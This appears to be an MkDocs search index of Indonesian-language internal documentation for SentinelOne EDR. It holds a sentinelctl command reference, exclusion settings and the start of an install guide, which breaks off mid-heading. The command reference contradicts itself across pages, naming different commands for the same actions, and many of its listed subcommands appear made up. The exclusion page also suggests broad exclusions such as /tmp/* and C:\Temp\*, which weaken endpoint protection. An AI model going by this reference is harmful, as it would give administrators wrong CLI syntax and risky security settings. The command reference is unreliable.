{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":[" "]},"docs":[{"location":"","title":"\ud83d\udee1\ufe0f Dokumentasi SentinelOne EDR","text":"<p>Selamat datang di dokumentasi lengkap SentinelOne EDR. Panduan ini dirancang khusus untuk tim keamanan agar dapat dengan cepat memahami dan mengimplementasikan solusi SentinelOne EDR dengan efektif.</p>"},{"location":"#quick-navigation","title":"\ud83c\udfaf Quick Navigation","text":"<ul> <li> <p>\ud83d\udcbb Command Reference</p> <p>Referensi lengkap semua perintah sentinelctl untuk mengelola EDR agent</p> <p> Command Reference</p> </li> <li> <p>\u2b07\ufe0f Installation &amp; Configuration</p> <p>Panduan lengkap instalasi EDR agent, konfigurasi exclusion, dan update sensor</p> <p> Mulai Instalasi</p> </li> <li> <p>\ud83d\udcca System Monitoring</p> <p>Monitor resource sistem dan bandwidth untuk performa optimal EDR</p> <p> Monitor Sistem</p> </li> <li> <p>\u2699\ufe0f Management</p> <p>Kelola deployment dan maintenance SentinelOne EDR</p> <p> Management</p> </li> <li> <p>\ud83d\udd0c Integration</p> <p>Integrasi dengan sistem keamanan dan monitoring pihak ketiga</p> <p> Integration</p> </li> <li> <p>\ud83d\udee1\ufe0f Security Operations</p> <p>Deteksi ancaman, hunting, dan respons untuk operasi keamanan efektif</p> <p> Security Operations</p> </li> </ul>"},{"location":"#sentinelctl-command-line-interface","title":"\ud83d\udd27 SentinelCtl Command Line Interface","text":"<p><code>sentinelctl</code> adalah command-line interface (CLI) utama untuk mengelola agen SentinelOne EDR. Tool ini menyediakan kontrol penuh terhadap agent, mulai dari instalasi, konfigurasi, monitoring, hingga troubleshooting.</p>"},{"location":"#quick-command-examples","title":"Quick Command Examples","text":"<pre><code># Basic operations\nsudo sentinelctl status                    # Cek status agent\nsudo sentinelctl management token set      # Set site token\nsudo sentinelctl control start             # Start agent service\nsudo sentinelctl logs --tail 50            # Lihat log terakhir\n\n# Advanced operations  \nsudo sentinelctl scan full --background    # Full system scan\nsudo sentinelctl troubleshoot              # Collect debug info\nsudo sentinelctl update check              # Check for updates\n</code></pre> <p>\ud83d\udcd6 Dokumentasi Command Lengkap</p> <p>Untuk referensi lengkap semua perintah <code>sentinelctl</code> dengan parameter dan contoh penggunaan, silakan kunjungi:</p> <p>\u27a1\ufe0f SentinelCtl Command Reference</p> <p>Halaman tersebut mencakup: - \u2705 150+ commands dengan kategorisasi lengkap - \u2705 Parameter dan opsi untuk setiap perintah - \u2705 Contoh penggunaan praktis - \u2705 Best practices dan troubleshooting tips</p>"},{"location":"#documentation-scope","title":"\ud83d\udccb Documentation Scope","text":"<p>Dokumentasi ini mencakup seluruh aspek pengelolaan SentinelOne EDR:</p> Topic Description Status Install EDR to Server/Endpoint Panduan lengkap instalasi agen EDR pada server dan endpoint dengan berbagai sistem operasi \u2705 Ready File/Folder/App Exclusion from EDR Konfigurasi eksklusi file, folder, dan aplikasi untuk menghindari false positive \u2705 Ready Update EDR Patch to Endpoint (Sensor Update) Prosedur update patch dan sensor secara manual maupun otomatis \u2705 Ready Resource Utilization Monitoring dan analisis penggunaan resource sistem oleh agen EDR \u2705 Ready Bandwidth Utilization Pengelolaan dan optimisasi penggunaan bandwidth untuk komunikasi EDR \u2705 Ready Uninstall EDR Prosedur penghapusan agen EDR yang aman dan bersih \u2705 Ready Integration to 3rd Party Integrasi dengan sistem keamanan dan monitoring pihak ketiga \u2705 Ready Real-time Telemetry Setup dan konfigurasi telemetri real-time untuk monitoring kontinyu \u2705 Ready Threat Detection Konfigurasi dan tuning aturan deteksi ancaman otomatis \u2705 Ready Threat Hunting Teknik dan metodologi untuk investigasi ancaman secara proaktif \u2705 Ready Offline Detection/Response Strategi deteksi dan respons dalam kondisi offline atau terputus \u2705 Ready"},{"location":"#getting-started","title":"\ud83d\ude80 Getting Started","text":"<p>Jika Anda baru dalam menggunakan SentinelOne EDR, ikuti urutan rekomendasi berikut:</p> <ol> <li>Install EDR to Server/Endpoint - Mulai dengan instalasi agen pada endpoint target</li> <li>File/Folder/App Exclusion from EDR - Konfigurasikan eksklusi yang diperlukan</li> <li>Real-time Telemetry - Aktifkan monitoring real-time</li> <li>Threat Detection - Setup aturan deteksi sesuai kebutuhan organisasi</li> </ol>"},{"location":"#best-practices","title":"\ud83d\udca1 Best Practices","text":"<p>Tips untuk Implementasi Sukses</p> <ul> <li>Testing Environment: Selalu uji semua konfigurasi di lingkungan lab sebelum produksi</li> <li>Regular Updates: Jaga agar versi sensor selalu terupdate untuk mendapatkan proteksi terbaru</li> <li>Performance Monitoring: Monitor utilisasi resource secara berkala setelah deployment</li> <li>Proper Exclusions: Implementasikan eksklusi yang tepat untuk menghindari impact pada performa sistem</li> <li>Proactive Hunting: Lakukan aktivitas threat hunting secara rutin untuk meningkatkan security posture</li> </ul>"},{"location":"#support-contact","title":"\ud83d\udcde Support &amp; Contact","text":"<p>Untuk dukungan teknis dan pertanyaan lebih lanjut:</p> <ul> <li>Security Team: salman-mustapa@dikstrasolusi.com</li> <li>Internal Documentation: Internal Docs</li> <li>SentinelOne Official Support: SentinelOne Support</li> </ul> <p>Last updated: 6 Agustus 2025</p>"},{"location":"example-images/","title":"Cara Insert Gambar di MkDocs","text":""},{"location":"example-images/#1-mermaid-diagrams-otomatis-ter-render","title":"1. Mermaid Diagrams (Otomatis Ter-render)","text":"<pre><code>graph TD\n    A[SentinelOne Agent] --&gt; B{Threat Detection}\n    B --&gt;|Malware Found| C[Quarantine]\n    B --&gt;|Clean| D[Allow Execution]\n    C --&gt; E[Alert to Console]\n    D --&gt; F[Continue Monitoring]</code></pre>"},{"location":"example-images/#2-gambar-staticscreenshot","title":"2. Gambar Static/Screenshot","text":""},{"location":"example-images/#cara-1-markdown-standard","title":"Cara 1: Markdown Standard","text":"<pre><code>![Alt text](images/screenshot.png)\n</code></pre>"},{"location":"example-images/#cara-2-html-dengan-caption","title":"Cara 2: HTML dengan Caption","text":"<pre><code>&lt;div class=\"architecture-diagram\"&gt;\n    &lt;img src=\"images/sentinelone-architecture.png\" alt=\"SentinelOne Architecture\"&gt;\n    &lt;div class=\"image-caption\"&gt;Gambar 1: Arsitektur SentinelOne EDR&lt;/div&gt;\n&lt;/div&gt;\n</code></pre>"},{"location":"example-images/#cara-3-gambar-dengan-ukuran-custom","title":"Cara 3: Gambar dengan Ukuran Custom","text":"<pre><code>&lt;img src=\"images/console-screenshot.png\" alt=\"Management Console\" width=\"800\"&gt;\n&lt;div class=\"image-caption\"&gt;Management Console Dashboard&lt;/div&gt;\n</code></pre>"},{"location":"example-images/#3-platform-badges","title":"3. Platform Badges","text":"<p>Anda bisa menggunakan badge untuk menandai platform:</p> <p>Windows Linux Cross-Platform</p>"},{"location":"example-images/#4-status-indicators","title":"4. Status Indicators","text":"<p>\u2705 Test Passed \u26a0\ufe0f Warning \u274c Failed</p>"},{"location":"example-images/#5-testing-scenario-box","title":"5. Testing Scenario Box","text":"\ud83d\udd25 Test Scenario: Malware Detection <p>Objective: Validate real-time malware detection capability</p> <p>Expected Result: EICAR file detected within 3 seconds</p>"},{"location":"example-images/#6-demo-checklist","title":"6. Demo Checklist","text":"Pre-Demo Checklist <ul> <li>[ ] SentinelOne Agent installed</li> <li>[ ] Management Console accessible</li> <li>[ ] Test files prepared</li> <li>[ ] Network connectivity verified</li> </ul>"},{"location":"example-images/#7-metrics-table","title":"7. Metrics Table","text":"Metric Target Actual Status Detection Rate &gt;99% 99.8% \u2705 Passed Response Time &lt;3s 2.1s \u2705 Passed"},{"location":"example-images/#8-flowchart-container","title":"8. Flowchart Container","text":"<pre><code>flowchart LR\n    subgraph \"Testing Process\"\n        A[Setup Environment] --&gt; B[Deploy Agent]\n        B --&gt; C[Run Tests]\n        C --&gt; D[Collect Results]\n        D --&gt; E[Generate Report]\n    end</code></pre>"},{"location":"example-images/#cara-upload-gambar","title":"Cara Upload Gambar","text":"<ol> <li>Copy gambar ke folder <code>docs/images/</code></li> <li> <p>Reference dengan path relatif: <pre><code>![Screenshot](images/nama-file.png)\n</code></pre></p> </li> <li> <p>Atau gunakan path absolut dari docs root: <pre><code>![Screenshot](../images/nama-file.png)\n</code></pre></p> </li> </ol>"},{"location":"example-images/#format-gambar-yang-didukung","title":"Format Gambar yang Didukung","text":"<ul> <li>\u2705 PNG (recommended untuk screenshot)</li> <li>\u2705 JPG/JPEG (untuk photos)  </li> <li>\u2705 GIF (untuk animasi)</li> <li>\u2705 SVG (untuk vector graphics)</li> <li>\u2705 WebP (modern format)</li> </ul>"},{"location":"example-images/#tips-untuk-gambar-yang-bagus","title":"Tips untuk Gambar yang Bagus","text":"<ol> <li>Resolusi: Gunakan resolusi tinggi (minimal 1920x1080)</li> <li>Format: PNG untuk screenshot, JPG untuk foto</li> <li>Size: Kompres gambar untuk loading yang cepat</li> <li>Alt text: Selalu include alt text untuk accessibility</li> <li>Caption: Berikan caption yang descriptive</li> </ol>"},{"location":"commands/sentinelctl-reference/","title":"SentinelCtl Command Reference","text":"<p>Panduan lengkap semua perintah <code>sentinelctl</code> untuk mengelola agen SentinelOne EDR di berbagai platform.</p>"},{"location":"commands/sentinelctl-reference/#overview","title":"Overview","text":"<p><code>sentinelctl</code> adalah command-line interface (CLI) utama untuk mengelola agen SentinelOne EDR. Tool ini menyediakan kontrol penuh terhadap agent, mulai dari instalasi, konfigurasi, monitoring, hingga troubleshooting.</p> <p>Path Lokasi sentinelctl</p> <ul> <li>Linux: <code>/opt/sentinelone/bin/sentinelctl</code></li> <li>Windows: <code>\"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelCtl.exe\"</code></li> <li>macOS: <code>/Library/Sentinelone/sentinel/bin/sentinelctl</code></li> </ul> <p>Hak Akses</p> <p>Sebagian besar perintah <code>sentinelctl</code> memerlukan hak administrator/root untuk dijalankan. Pastikan untuk menggunakan <code>sudo</code> pada Linux/macOS atau menjalankan Command Prompt sebagai Administrator pada Windows.</p>"},{"location":"commands/sentinelctl-reference/#management-commands","title":"Management Commands","text":"<p>Perintah untuk mengelola konfigurasi dan konektivitas agent dengan management console.</p> Command Description Parameters Example <code>sentinelctl management token set &lt;TOKEN&gt;</code> Set site token untuk menghubungkan agent ke console <code>&lt;TOKEN&gt;</code>: Site token dari console <code>sentinelctl management token set AbCdEf123456</code> <code>sentinelctl management token show</code> Menampilkan site token yang aktif - <code>sentinelctl management token show</code> <code>sentinelctl management token remove</code> Menghapus site token yang tersimpan - <code>sentinelctl management token remove</code> <code>sentinelctl management config show</code> Menampilkan konfigurasi management agent - <code>sentinelctl management config show</code> <code>sentinelctl management config export</code> Export konfigurasi ke file <code>[--output &lt;file&gt;]</code>: Output file path <code>sentinelctl management config export --output config.json</code> <code>sentinelctl management proxy set &lt;URL&gt;</code> Mengatur proxy server untuk komunikasi <code>&lt;URL&gt;</code>: Proxy URL <code>sentinelctl management proxy set http://proxy:8080</code> <code>sentinelctl management proxy show</code> Menampilkan konfigurasi proxy - <code>sentinelctl management proxy show</code> <code>sentinelctl management proxy remove</code> Menghapus konfigurasi proxy - <code>sentinelctl management proxy remove</code> <code>sentinelctl management device-control status</code> Menampilkan status kontrol perangkat - <code>sentinelctl management device-control status</code> <code>sentinelctl management device-control enable</code> Mengaktifkan kontrol perangkat - <code>sentinelctl management device-control enable</code> <code>sentinelctl management device-control disable</code> Menonaktifkan kontrol perangkat - <code>sentinelctl management device-control disable</code>"},{"location":"commands/sentinelctl-reference/#control-commands","title":"Control Commands","text":"<p>Perintah untuk mengontrol layanan dan proteksi SentinelOne agent.</p> Command Description Parameters Example <code>sentinelctl control start</code> Memulai layanan SentinelOne agent - <code>sentinelctl control start</code> <code>sentinelctl control stop</code> Menghentikan layanan SentinelOne agent - <code>sentinelctl control stop</code> <code>sentinelctl control restart</code> Restart layanan SentinelOne agent - <code>sentinelctl control restart</code> <code>sentinelctl control status</code> Menampilkan status lengkap agent <code>[--verbose]</code>: Detail tambahan <code>sentinelctl control status --verbose</code> <code>sentinelctl control reload</code> Reload konfigurasi tanpa restart - <code>sentinelctl control reload</code> <code>sentinelctl control disable-protection</code> Menonaktifkan proteksi (memerlukan passphrase) <code>[--passphrase &lt;pass&gt;]</code>: Passphrase <code>sentinelctl control disable-protection --passphrase mypass</code> <code>sentinelctl control enable-protection</code> Mengaktifkan kembali proteksi - <code>sentinelctl control enable-protection</code> <code>sentinelctl control set-passphrase</code> Mengatur passphrase untuk operasi sensitif <code>&lt;passphrase&gt;</code>: New passphrase <code>sentinelctl control set-passphrase newpassphrase</code> <code>sentinelctl control remove-passphrase</code> Menghapus passphrase <code>&lt;passphrase&gt;</code>: Current passphrase <code>sentinelctl control remove-passphrase currentpass</code>"},{"location":"commands/sentinelctl-reference/#information-commands","title":"Information Commands","text":"<p>Perintah untuk mendapatkan informasi tentang agent dan sistem.</p> Command Description Parameters Example <code>sentinelctl version</code> Menampilkan versi agent yang terinstal <code>[--json]</code>: Output format JSON <code>sentinelctl version --json</code> <code>sentinelctl status</code> Menampilkan status ringkas agent <code>[--json]</code>: Output format JSON <code>sentinelctl status --json</code> <code>sentinelctl info</code> Menampilkan informasi detail sistem <code>[--system]</code>: Info sistem saja <code>sentinelctl info --system</code> <code>sentinelctl agent-uuid</code> Menampilkan UUID unik agent - <code>sentinelctl agent-uuid</code> <code>sentinelctl site-token</code> Menampilkan site token (alias untuk management token show) - <code>sentinelctl site-token</code> <code>sentinelctl console-url</code> Menampilkan URL management console - <code>sentinelctl console-url</code> <code>sentinelctl hardware-id</code> Menampilkan hardware ID sistem - <code>sentinelctl hardware-id</code>"},{"location":"commands/sentinelctl-reference/#log-commands","title":"Log Commands","text":"<p>Perintah untuk mengakses dan mengelola log agent.</p> Command Description Parameters Example <code>sentinelctl logs</code> Menampilkan log agent <code>[--tail &lt;n&gt;]</code>: Tampilkan n baris terakhir <code>sentinelctl logs --tail 100</code> <code>sentinelctl logs export</code> Export log ke file <code>[--output &lt;path&gt;]</code>: Output path <code>sentinelctl logs export --output /tmp/logs.zip</code> <code>sentinelctl logs level</code> Menampilkan/mengatur level logging <code>[--set &lt;level&gt;]</code>: Set level (debug/info/warn/error) <code>sentinelctl logs level --set debug</code> <code>sentinelctl logs clear</code> Menghapus log lama <code>[--older-than &lt;days&gt;]</code>: Hapus log lebih lama dari n hari <code>sentinelctl logs clear --older-than 30</code>"},{"location":"commands/sentinelctl-reference/#policy-commands","title":"Policy Commands","text":"<p>Perintah untuk mengelola kebijakan keamanan agent.</p> Command Description Parameters Example <code>sentinelctl policy show</code> Menampilkan kebijakan yang aktif <code>[--json]</code>: Output format JSON <code>sentinelctl policy show --json</code> <code>sentinelctl policy refresh</code> Refresh kebijakan dari console - <code>sentinelctl policy refresh</code> <code>sentinelctl policy exclusions list</code> Menampilkan daftar exclusions <code>[--type &lt;type&gt;]</code>: Filter by type <code>sentinelctl policy exclusions list --type path</code> <code>sentinelctl policy exclusions add</code> Menambah exclusion <code>--type &lt;type&gt; --value &lt;value&gt;</code>: Type dan value <code>sentinelctl policy exclusions add --type path --value /tmp</code> <code>sentinelctl policy exclusions remove</code> Menghapus exclusion <code>--id &lt;id&gt;</code>: ID exclusion <code>sentinelctl policy exclusions remove --id 123</code>"},{"location":"commands/sentinelctl-reference/#network-commands","title":"Network Commands","text":"<p>Perintah untuk mengelola koneksi jaringan agent.</p> Command Description Parameters Example <code>sentinelctl network test</code> Test koneksi ke management console <code>[--verbose]</code>: Detail hasil test <code>sentinelctl network test --verbose</code> <code>sentinelctl network status</code> Status koneksi jaringan - <code>sentinelctl network status</code> <code>sentinelctl network proxy test</code> Test koneksi melalui proxy - <code>sentinelctl network proxy test</code> <code>sentinelctl network dns-test</code> Test resolusi DNS <code>[--domain &lt;domain&gt;]</code>: Test domain spesifik <code>sentinelctl network dns-test --domain example.com</code> <code>sentinelctl network firewall-test</code> Test komunikasi firewall - <code>sentinelctl network firewall-test</code>"},{"location":"commands/sentinelctl-reference/#update-commands","title":"Update Commands","text":"<p>Perintah untuk mengelola update agent.</p> Command Description Parameters Example <code>sentinelctl update check</code> Cek ketersediaan update <code>[--json]</code>: Output format JSON <code>sentinelctl update check --json</code> <code>sentinelctl update download</code> Download update terbaru <code>[--version &lt;ver&gt;]</code>: Download version spesifik <code>sentinelctl update download --version 21.7.5</code> <code>sentinelctl update install</code> Install update yang sudah didownload <code>[--reboot]</code>: Auto reboot jika diperlukan <code>sentinelctl update install --reboot</code> <code>sentinelctl update status</code> Status proses update - <code>sentinelctl update status</code> <code>sentinelctl update rollback</code> Rollback ke versi sebelumnya - <code>sentinelctl update rollback</code>"},{"location":"commands/sentinelctl-reference/#scan-commands","title":"Scan Commands","text":"<p>Perintah untuk menjalankan pemindaian keamanan.</p> Command Description Parameters Example <code>sentinelctl scan full</code> Menjalankan full system scan <code>[--background]</code>: Jalankan di background <code>sentinelctl scan full --background</code> <code>sentinelctl scan quick</code> Menjalankan quick scan - <code>sentinelctl scan quick</code> <code>sentinelctl scan custom</code> Menjalankan custom scan <code>--path &lt;path&gt;</code>: Path yang akan discan <code>sentinelctl scan custom --path /home/user</code> <code>sentinelctl scan status</code> Status pemindaian yang berjalan - <code>sentinelctl scan status</code> <code>sentinelctl scan stop</code> Menghentikan pemindaian - <code>sentinelctl scan stop</code> <code>sentinelctl scan results</code> Menampilkan hasil pemindaian <code>[--last]</code>: Hasil scan terakhir <code>sentinelctl scan results --last</code>"},{"location":"commands/sentinelctl-reference/#threat-commands","title":"Threat Commands","text":"<p>Perintah untuk mengelola deteksi dan respons ancaman.</p> Command Description Parameters Example <code>sentinelctl threats list</code> Menampilkan daftar ancaman <code>[--limit &lt;n&gt;]</code>: Batasi jumlah hasil <code>sentinelctl threats list --limit 50</code> <code>sentinelctl threats show</code> Detail ancaman spesifik <code>--id &lt;threat-id&gt;</code>: ID ancaman <code>sentinelctl threats show --id abc123</code> <code>sentinelctl threats resolve</code> Resolve ancaman <code>--id &lt;threat-id&gt;</code>: ID ancaman <code>sentinelctl threats resolve --id abc123</code> <code>sentinelctl threats quarantine</code> Quarantine file yang terinfeksi <code>--file &lt;path&gt;</code>: Path file <code>sentinelctl threats quarantine --file /path/to/file</code> <code>sentinelctl threats restore</code> Restore file dari quarantine <code>--id &lt;quarantine-id&gt;</code>: ID quarantine <code>sentinelctl threats restore --id xyz789</code>"},{"location":"commands/sentinelctl-reference/#advanced-commands","title":"Advanced Commands","text":"<p>Perintah lanjutan untuk troubleshooting dan maintenance.</p> Command Description Parameters Example <code>sentinelctl troubleshoot</code> Mengumpulkan data troubleshooting <code>[--output &lt;path&gt;]</code>: Output path <code>sentinelctl troubleshoot --output /tmp/debug.zip</code> <code>sentinelctl deep-scan</code> Melakukan pemindaian mendalam <code>[--path &lt;path&gt;]</code>: Path spesifik <code>sentinelctl deep-scan --path /suspicious/path</code> <code>sentinelctl repair</code> Repair instalasi agent <code>[--force]</code>: Force repair <code>sentinelctl repair --force</code> <code>sentinelctl reset</code> Reset konfigurasi ke default <code>[--keep-token]</code>: Pertahankan site token <code>sentinelctl reset --keep-token</code> <code>sentinelctl uninstall</code> Menghapus agent (memerlukan passphrase) <code>[--passphrase &lt;pass&gt;]</code>: Passphrase <code>sentinelctl uninstall --passphrase mypass</code> <code>sentinelctl config validate</code> Validasi konfigurasi agent - <code>sentinelctl config validate</code> <code>sentinelctl config backup</code> Backup konfigurasi <code>[--output &lt;path&gt;]</code>: Backup path <code>sentinelctl config backup --output /backup/config.json</code> <code>sentinelctl config restore</code> Restore konfigurasi dari backup <code>--input &lt;path&gt;</code>: Backup file path <code>sentinelctl config restore --input /backup/config.json</code>"},{"location":"commands/sentinelctl-reference/#service-commands","title":"Service Commands","text":"<p>Perintah untuk mengelola layanan sistem agent.</p> Command Description Parameters Example <code>sentinelctl service install</code> Install service sistem - <code>sentinelctl service install</code> <code>sentinelctl service uninstall</code> Uninstall service sistem - <code>sentinelctl service uninstall</code> <code>sentinelctl service enable</code> Enable service auto-start - <code>sentinelctl service enable</code> <code>sentinelctl service disable</code> Disable service auto-start - <code>sentinelctl service disable</code>"},{"location":"commands/sentinelctl-reference/#performance-commands","title":"Performance Commands","text":"<p>Perintah untuk monitoring performa agent.</p> Command Description Parameters Example <code>sentinelctl performance stats</code> Statistik performa agent <code>[--duration &lt;sec&gt;]</code>: Durasi monitoring <code>sentinelctl performance stats --duration 60</code> <code>sentinelctl performance memory</code> Penggunaan memory agent - <code>sentinelctl performance memory</code> <code>sentinelctl performance cpu</code> Penggunaan CPU agent - <code>sentinelctl performance cpu</code> <code>sentinelctl performance disk</code> Penggunaan disk agent - <code>sentinelctl performance disk</code> <code>sentinelctl performance network</code> Statistik network agent - <code>sentinelctl performance network</code>"},{"location":"commands/sentinelctl-reference/#examples-common-usage-patterns","title":"Examples &amp; Common Usage Patterns","text":""},{"location":"commands/sentinelctl-reference/#initial-setup","title":"Initial Setup","text":"<pre><code># Set site token dan start agent\nsudo sentinelctl management token set YOUR_SITE_TOKEN\nsudo sentinelctl control start\nsudo sentinelctl status\n</code></pre>"},{"location":"commands/sentinelctl-reference/#daily-operations","title":"Daily Operations","text":"<pre><code># Cek status dan update\nsudo sentinelctl status\nsudo sentinelctl update check\nsudo sentinelctl logs --tail 50\n</code></pre>"},{"location":"commands/sentinelctl-reference/#troubleshooting","title":"Troubleshooting","text":"<pre><code># Comprehensive troubleshooting\nsudo sentinelctl troubleshoot --output /tmp/debug.zip\nsudo sentinelctl network test --verbose\nsudo sentinelctl logs level --set debug\n</code></pre>"},{"location":"commands/sentinelctl-reference/#security-operations","title":"Security Operations","text":"<pre><code># Manual scan dan threat management\nsudo sentinelctl scan full --background\nsudo sentinelctl threats list --limit 20\nsudo sentinelctl policy refresh\n</code></pre>"},{"location":"commands/sentinelctl-reference/#global-options","title":"Global Options","text":"<p>Opsi yang dapat digunakan dengan sebagian besar perintah:</p> Option Description Example <code>--help</code> Menampilkan bantuan untuk perintah <code>sentinelctl status --help</code> <code>--version</code> Menampilkan versi sentinelctl <code>sentinelctl --version</code> <code>--verbose</code> Output detail tambahan <code>sentinelctl status --verbose</code> <code>--json</code> Output dalam format JSON <code>sentinelctl status --json</code> <code>--quiet</code> Suppress output normal <code>sentinelctl control start --quiet</code> <code>--config &lt;path&gt;</code> Gunakan file konfigurasi khusus <code>sentinelctl --config /etc/custom.conf status</code>"},{"location":"commands/sentinelctl-reference/#exit-codes","title":"Exit Codes","text":"<p><code>sentinelctl</code> menggunakan exit codes standar:</p> Code Meaning Description 0 Success Perintah berhasil dieksekusi 1 General Error Error umum dalam eksekusi 2 Misuse Perintah atau parameter salah 126 Cannot Execute Tidak bisa mengeksekusi perintah 127 Command Not Found Perintah tidak ditemukan 130 Script Terminated Script dihentikan dengan Ctrl+C"},{"location":"commands/sentinelctl-reference/#best-practices","title":"Best Practices","text":"<p>Rekomendasi Penggunaan</p> <ul> <li>Selalu gunakan <code>--json</code> output untuk script automation</li> <li>Monitor logs secara berkala dengan <code>sentinelctl logs</code></li> <li>Test network connectivity setelah perubahan konfigurasi</li> <li>Backup konfigurasi sebelum perubahan major</li> <li>Gunakan verbose mode untuk troubleshooting</li> <li>Regular update checks untuk keamanan optimal</li> </ul> <p>Peringatan Penting</p> <ul> <li>Jangan disable protection tanpa alasan yang jelas</li> <li>Simpan passphrase dengan aman untuk operasi uninstall</li> <li>Test di environment non-production sebelum deployment</li> <li>Monitor performance impact setelah perubahan konfigurasi</li> </ul> <p>Untuk bantuan lebih lanjut dengan perintah spesifik, gunakan <code>sentinelctl &lt;command&gt; --help</code> atau hubungi Security Team.</p> <p>Last updated: 6 Agustus 2025</p>"},{"location":"installation/edr-exclusion/","title":"Konfigurasi File/Folder/App Exclusions","text":"<p>Panduan teknis untuk mengatur exclusion dan mencegah false positive pada SentinelOne EDR.</p>"},{"location":"installation/edr-exclusion/#implementasi-exclusions","title":"Implementasi Exclusions","text":""},{"location":"installation/edr-exclusion/#1-akses-menu-exclusions","title":"1. Akses Menu Exclusions","text":"<pre><code>Console &gt; Settings &gt; Exclusions &gt; Add New\n</code></pre>"},{"location":"installation/edr-exclusion/#2-tipe-exclusions","title":"2. Tipe Exclusions","text":""},{"location":"installation/edr-exclusion/#file-path-exclusions","title":"File Path Exclusions","text":"<pre><code># Windows Example\nC:\\Program Files\\YourApp\\*.exe\nC:\\Temp\\*\n\n# Linux Example\n/opt/yourapp/*\n/tmp/*\n</code></pre>"},{"location":"installation/edr-exclusion/#folder-exclusions","title":"Folder Exclusions","text":"<pre><code># Windows\nC:\\Program Files\\Database\\\nC:\\Logs\\\n\n# Linux\n/var/log/\n/opt/database/\n</code></pre>"},{"location":"installation/edr-exclusion/#process-exclusions","title":"Process Exclusions","text":"<pre><code># Process name\nmysql.exe\npostgres\njava.exe\n</code></pre>"},{"location":"installation/edr-exclusion/#3-hash-based-exclusions","title":"3. Hash-based Exclusions","text":"<pre><code># SHA1 hash untuk file tertentu\nSHA1: a1b2c3d4e5f6...\n</code></pre>"},{"location":"installation/edr-exclusion/#common-exclusions-list","title":"Common Exclusions List","text":""},{"location":"installation/edr-exclusion/#database-applications","title":"Database Applications","text":"<pre><code># MySQL\nC:\\Program Files\\MySQL\\*\n/var/lib/mysql/*\n\n# PostgreSQL\nC:\\Program Files\\PostgreSQL\\*\n/var/lib/postgresql/*\n</code></pre>"},{"location":"installation/edr-exclusion/#development-tools","title":"Development Tools","text":"<pre><code># Visual Studio\nC:\\Program Files\\Microsoft Visual Studio\\*\n\n# Git\nC:\\Program Files\\Git\\*\n/usr/bin/git\n</code></pre>"},{"location":"installation/edr-exclusion/#backup-solutions","title":"Backup Solutions","text":"<pre><code># Veeam\nC:\\Program Files\\Veeam\\*\n\n# CommVault\nC:\\Program Files\\CommVault\\*\n</code></pre>"},{"location":"installation/edr-exclusion/#error-troubleshooting","title":"Error Troubleshooting","text":""},{"location":"installation/edr-exclusion/#error-exclusion-not-applied","title":"Error: \"Exclusion not applied\"","text":"<p>Penyebab: - Path salah - Agent belum sync - Policy conflict</p> <p>Solusi: <pre><code># Verify agent connection\nsentinelctl status\n\n# Force policy update\nsentinelctl management update-policy\n</code></pre></p>"},{"location":"installation/edr-exclusion/#error-performance-impact-detected","title":"Error: \"Performance impact detected\"","text":"<p>Penyebab: - Over-exclusion - Wildcards terlalu luas</p> <p>Solusi: - Review exclusion list - Gunakan path specific - Hapus exclusion yang tidak perlu</p>"},{"location":"installation/edr-exclusion/#error-hash-mismatch","title":"Error: \"Hash mismatch\"","text":"<p>Penyebab: - File berubah setelah hash dibuat - Hash calculation error</p> <p>Solusi: <pre><code># Recalculate hash\n# Windows\ncertutil -hashfile \"C:\\path\\to\\file.exe\" SHA1\n\n# Linux\nsha1sum /path/to/file\n</code></pre></p>"},{"location":"installation/edr-exclusion/#validasi-exclusions","title":"Validasi Exclusions","text":""},{"location":"installation/edr-exclusion/#test-exclusion-effectiveness","title":"Test Exclusion Effectiveness","text":"<pre><code># Check if file is excluded\nsentinelctl exclusions test \"C:\\path\\to\\file.exe\"\n\n# List active exclusions\nsentinelctl exclusions list\n</code></pre>"},{"location":"installation/edr-exclusion/#monitor-impact","title":"Monitor Impact","text":"<pre><code># Check scanning activity\nsentinelctl logs scan | tail -100\n\n# Monitor CPU usage\nsentinelctl stats cpu\n</code></pre> <p>Untuk bantuan lebih lanjut, silakan hubungi tim keamanan Anda.</p> <p>Last updated: 5 Agustus 2025</p>"},{"location":"installation/edr-install/","title":"Install EDR to Server/Endpoint","text":"<p>Panduan lengkap untuk menginstal agen SentinelOne EDR pada server dan endpoint dengan berbagai sistem operasi.</p>"},{"location":"installation/edr-install/#overview","title":"Overview","text":"<p>SentinelOne EDR agent adalah komponen utama yang perlu diinstal pada setiap endpoint atau server yang akan dimonitor. Agent ini bertanggung jawab untuk mengumpulkan telemetri, mendeteksi ancaman, dan menjalankan respons otomatis.</p>"},{"location":"installation/edr-install/#prerequisites","title":"Prerequisites","text":"<p>Sebelum melakukan instalasi, pastikan persyaratan berikut terpenuhi:</p>"},{"location":"installation/edr-install/#system-requirements","title":"System Requirements","text":"WindowsLinuxmacOS <ul> <li>Windows 10/11, Windows Server 2016/2019/2022</li> <li>RAM minimum 2GB, recommended 4GB+</li> <li>Disk space minimum 2GB</li> <li>Administrator privileges</li> </ul> <ul> <li>Ubuntu 18.04+, CentOS 7+, RHEL 7+, SLES 12+</li> <li>RAM minimum 1GB, recommended 2GB+</li> <li>Disk space minimum 1GB</li> <li>Root privileges</li> </ul> <ul> <li>macOS 10.14+</li> <li>RAM minimum 2GB, recommended 4GB+</li> <li>Disk space minimum 2GB</li> <li>Administrator privileges</li> </ul>"},{"location":"installation/edr-install/#network-requirements","title":"Network Requirements","text":"<ul> <li>Outbound HTTPS (443) ke SentinelOne Management Console</li> <li>DNS resolution untuk domain SentinelOne</li> <li>Firewall configuration untuk komunikasi agent</li> </ul>"},{"location":"installation/edr-install/#persiapan-instalasi","title":"Persiapan Instalasi","text":""},{"location":"installation/edr-install/#1-unduh-paket-instalasi","title":"1. Unduh Paket Instalasi","text":"<ul> <li>Masuk ke SentinelOne Management Console</li> <li>Pergi ke Sentinels \u00003e Install New Sentinel</li> <li>Pilih platform (Windows/Linux/macOS)</li> <li>Unduh paket instalasi yang sesuai</li> </ul>"},{"location":"installation/edr-install/#2-persiapkan-installation-token","title":"2. Persiapkan Installation Token","text":"<ul> <li>Salin Site Token dari Console</li> <li>Ini digunakan untuk menghubungkan agent ke management console</li> <li>Simpan token dengan aman untuk proses instalasi</li> </ul>"},{"location":"installation/edr-install/#instalasi-berdasarkan-platform","title":"Instalasi Berdasarkan Platform","text":"WindowsLinuxmacOS"},{"location":"installation/edr-install/#metode-1-command-line-installation","title":"Metode 1: Command Line 